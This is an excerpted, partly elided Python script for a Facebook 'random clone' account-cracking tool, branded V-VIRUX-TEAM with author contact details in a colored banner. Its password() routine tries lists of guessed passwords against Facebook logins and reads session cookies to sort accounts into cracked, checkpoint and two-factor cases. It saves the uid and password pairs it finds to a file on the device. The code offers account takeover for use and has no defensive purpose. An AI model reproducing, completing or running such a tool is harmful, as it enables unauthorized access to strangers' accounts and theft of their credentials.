...
{BLUE}=  ====  ==      ====  =======
==============================
\033[1;37m╔ⒽⒷⒻ═════════════════\033[1;33mV-VIRUX-TEAM\033[1;37m══════════════ⒽⒷⒻ╗
\033[1;31m│\033[1;32m☞  \033[1;32m𝐀𝐔𝐓𝐇𝐎𝐑     \033[1;31m➟   \033[1;32m𝓐𝓻𝓪𝓯𝓪𝓽 𝓑𝓲𝓷 𝓜𝓪𝓱𝓲𝓷     \033[1;31m│
\033[1;31m│\033[1;32m☞  \033[1;32m𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊   \033[1;31m➟   \033[1;32m𝓐𝓻𝓪𝓯𝓪𝓽 𝓑𝓲𝓷 𝓜𝓪𝓱𝓲𝓷\033[1;31m     │
\033[1;31m│\033[1;32m☞  \033[1;32m𝐆𝐈𝐓𝐇𝐔𝐁    \033[1;31m ➟   \033[1;32m𝓐𝓻𝓪𝓯𝓪𝓽  𝓜𝓪𝓱𝓲𝓷             \033[1;31m │
\033[1;31m│\033[1;32m☞  \033[1;32m𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏  \033[1;31m ➟   \033[1;32m+8801925798757            \033[1;31m │
\033[1;31m│\033[1;32m☞  \033[1;32m𝐕𝐄𝐑𝐒𝐈𝐎𝐍   \033[1;31m ➟   \033[1;32m0.4                     \033[1;31m   │
\033[1;31m│\033[1;32m☞  \033[1;32m𝐘𝐎𝐔𝐓𝐔𝐁𝐄   \033[1;31m ➟   \033[1;32m 𝓜𝓪𝓱𝓲𝓷             \033[1;31m   │
...
def my_tool_security():
    ...
    print(47*"-")
    print(c, 45*"-", wit)
    print("\t  Facebook : Arafat Mahin")
    print("\t  Fb page  : Mahin V-ViruX Cammands")
    print("\t  Github   : Arafat-Mahin310")
    print(c, 45*"-")
    print(47*"-")
    try:
...
#---------------------[MAIN MENU]---------------------#
def xyz():
    os.system("play-audio WELCOME_TO_Mahin_RANDOM_CLONE_TOOL.mp3")
    os.getuid
    ...
    if Mahin in ["1","01"]:
        ...
        os.system("xdg-open https://www.facebook.com/arafatmahin310");xyz()
    elif Mahin in ["4","04"]:
...
def password():
    ...
    linex()
    print("")
    passX = input(f" {RED}CHOOSE{Mahin2} : ")
    if passX in ['1','01']:
        ...
        for ps in pwx:
           ...
           "scheme": 'https',
            ...
            if 'c_user' in log_cookies:
                ...
                print('\r\033[1;32m[Mahin-OK] '+uid+' [√] '+ps+ '')
                ...
                if 'Enter login code to continue' in log_cookies:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uid=coki[24:39]
                    os.system("play-audio Mahin_2F.mp3")
                    print('\r\033[1;34m[Mahin-2F] '+uid+' [~] '+ps+' ')
                    open('/sdcard/Mahin-2F.txt', 'a').write(uid+' | '+ps+'\n')
                    twf.append(uid)
                else:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uid=coki[24:39]
                    Red = '\033[1;31m'
                    os.system("play-audio Mahin_CP.mp3")
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;37m[Mahin 🔥] [%s] \33[1;97m[OK:%s{Mahin2}CP:%s]'%(loop,len(ok),len(cp))), 
        sys.stdout.flush()
        checks(ok,cp)
    except:
        pass
